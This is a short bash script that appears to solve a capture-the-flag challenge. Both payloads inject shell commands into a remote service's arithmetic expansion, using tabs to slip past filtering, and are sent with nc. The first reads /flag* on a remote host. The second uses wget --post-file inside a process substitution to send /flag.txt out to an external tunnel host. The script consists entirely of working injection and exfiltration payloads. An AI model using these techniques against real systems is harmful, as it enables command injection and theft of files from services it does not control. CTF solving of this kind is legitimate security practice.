#!/bin/bash

# this '$((ls) )' construct runs the command ls instead of using arithmetic expansion
echo -e 'cat\t/flag*)\t)\t#' | nc 94.237.59.63 36274

# another solution could be this if the remote would allow outbound connections
echo -e '1))<(wget\thttps://9226c104a89fd9.lhr.life\t--post-file=/flag.txt)\t#' | nc localhost 1337
